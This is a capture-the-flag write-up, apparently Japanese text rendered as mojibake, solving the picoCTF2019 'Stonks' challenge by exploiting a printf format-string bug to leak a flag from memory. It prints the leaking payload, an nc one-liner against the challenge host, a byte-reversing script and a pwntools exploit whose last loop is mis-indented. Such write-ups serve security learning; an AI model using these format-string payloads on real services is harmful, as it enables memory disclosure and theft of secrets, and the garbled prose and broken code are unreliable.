# Stonks
## picoCTF2019
## Binary Exploition
***

å§‹ã‚ã«å•é¡Œã®æ¥ç¶šå…ˆã¨ã€æ¥ç¶šå…ˆã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒæ¸¡ã•ã‚Œã‚‹ã€‚  
ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ç›®ã‚’é€šã—ã¦ã„ãã¨ã€buy_stonks()ã§
```
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

ã®ã‚ˆã†ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒå‹•ã„ã¦ã„ãŸã€‚ã“ã‚Œã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®å…¥åŠ›å†…å®¹ã‚’ãã®ã¾ã¾å‡ºåŠ›ã—ã¦ã„ã‚‹ãŸã‚ã€æ›¸å¼æ–‡å­—åˆ—æ”»æ’ƒãŒå¯èƒ½ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã€‚  
è©¦ã—ã«ã“ã®ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã§%pã¨å…¥åŠ›ã—ã¦ã¿ã‚‹ã¨ã€
```
What is your API token?
%p
Buying stonks with token:
0x9f4f430
Portfolio as of Sat Jul 17 14:57:53 UTC 2021
```
ã¨è¿”ã£ã¦ãã¦ã„ã‚‹ãŸã‚ã€ã©ã†ã‚„ã‚‰æ›¸å¼æ–‡å­—åˆ—æ”»æ’ƒãŒå¯èƒ½ã£ã½ã„ã€‚  
ã¾ãŸã€ãŠãã‚‰ããƒ•ãƒ©ã‚°ãŒæ›¸ã‹ã‚Œã¦ã„ã‚‹ã¨æ€ã‚ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«apiãŒbuy_stonks()ã§èª­ã¿è¾¼ã¾ã‚Œã¦ã„ã‚‹ãŸã‚ã€ãƒ¡ãƒ¢ãƒªä¸Šã«ãƒ•ãƒ©ã‚°ãŒã‚ã‚‹ã¨è€ƒãˆã‚‰ã‚Œã‚‹ã€‚  
%pã‚’å…¥ã‚Œã‚‹ã¨ãƒ¡ãƒ¢ãƒªã«æ›¸ã‹ã‚Œã¦ã„ã‚‹å†…å®¹ãŒè¦‹ã‚Œã‚‹ã£ã½ã„ã®ã§ã€å¤§é‡ã«é€ã‚Šä»˜ã‘ãŸã‚‰ã©ã“ã‹ã«ãƒ•ãƒ©ã‚°ãŒã‹ã‹ã‚Œã¦ãã†ã ãŒã€ä½•å€‹ãŒã„ã„ã‹ã‚ã‹ã‚‰ãªã„ãŸã‚ã€ã¨ã‚Šã‚ãˆãš30å€‹ãã‚‰ã„é€ã‚Šä»˜ã‘ã‚‹ã€‚
```
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
0x9dda3d0.0x804b000.0x80489c3.0xf7ecfd80.0xffffffff.0x1.0x9dd8160.0xf7edd110.0xf7ecfdc7.(nil).0x9dd9180.0x1.0x9dda3b0.0x9dda3d0.0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x62633763.0x65616336.0xffc4007d.0xf7f0aaf8.0xf7edd440.0xf9a48000.0x1.(nil).0xf7d6cbe9.
Portfolio as of Sat Jul 17 15:07:13 UTC 2021
```

ã™ã‚‹ã¨ã“ã†ãªã£ãŸã€å½“ç„¶ã ãŒã€ã“ã®çŠ¶æ…‹ã§ã¯æ™®é€šã®äººé–“ã«ã¯èª­ã‚ãªã„ãŸã‚ã€xxdã¨trã‚’ä½¿ã£ã¦èª­ã‚ã‚‹å½¢ã«å¤‰ãˆã‚‹ã€‚  
>> python3 -c 'print("1\n" + "%p." * 50)' | nc mercury.picoctf.net 27912 | tr "." "\n" | xxd -r -p

ã™ã‚‹ã¨ä»¥ä¸‹ã®å‡ºåŠ›ãŒè¿”ã£ã¦ãã‚‹ã€‚

>> 0=?ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10}@LÅï¿½ï¿½H   K HmPLKHH$ i!S8

çµæ§‹èª­ã‚ãªã„ã¨ã“ã‚ãŒå¤šã„ãŒã€ãƒ•ãƒ©ã‚°ã£ã½ã„ã¨ã“ã‚ãŒã‚ã‚‹ã€‚ã—ã‹ã—ãƒªãƒˆãƒ«ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã«ãªã£ã¦ã„ã‚‹ãŸã‚ã€ã“ã®ã¾ã¾ã§ã¯å‡ºã›ãªã„ã€‚  
4æ–‡å­—ãšã¤åè»¢ã•ã›ã‚‹å¿…è¦ãŒã‚ã‚‹ãŒã€æ‰‹ä½œæ¥­ã¯é¢å€’ãªã®ã§ç°¡å˜ã«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ›¸ãã€‚  
```
m = "ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10}"
print(m)
for i in range(3, len(m), 4):
    for f in range(i, i-4, -1):
        print(m[f], end="")
print("}")
```
ã“ã‚Œã§å‡ºã¦ããŸå€¤ã‚’submitã™ã‚‹ã€‚

ã“ã‚Œã‚’è‡ªå‹•åŒ–exploit.pyã‚’ä½œæˆã™ã‚‹ã€‚
```
from pwn import *

s = ""

r = remote("mercury.picoctf.net", 27912)

r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

r.send("%x" + "-%x"*40 + "\n")

r.recvline()

x = r.recvline()

x = x[:-1].decode()

print(x) #ãƒªãƒ¼ã‚¯ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã®ä¸­èº«ãƒ‡ãƒ¼ã‚¿ãŒxã«å…¥ã£ã¦ã„ã‚‹

for i in x.split("-"):
    if len(i) == 8:
        a = bytearray.fromhex(i)
            for b in reversed(a):
                if b >32 and b < 128:
                    s += chr(b)
```